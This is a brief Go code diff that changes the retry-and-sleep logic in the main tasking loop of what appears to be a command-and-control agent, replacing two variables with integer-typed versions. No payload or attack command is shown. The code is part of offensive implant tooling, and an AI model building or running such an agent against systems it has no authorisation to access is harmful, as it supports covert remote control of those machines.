@@ -149,11 +149,11 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile) {
 			if err != nil {
 				log.Printf("[ERROR] Failed to get tasking: %v", err)
 				retryCount++
-				if retryCount >= maxRetries {
+				if retryCount >= maxRetriesInt {
 					log.Printf("[ERROR] Maximum retry count reached, exiting")
 					return
 				}
-				time.Sleep(time.Duration(sleepInterval) * time.Second)
+				time.Sleep(time.Duration(sleepIntervalInt) * time.Second)
 				continue
 			}
 
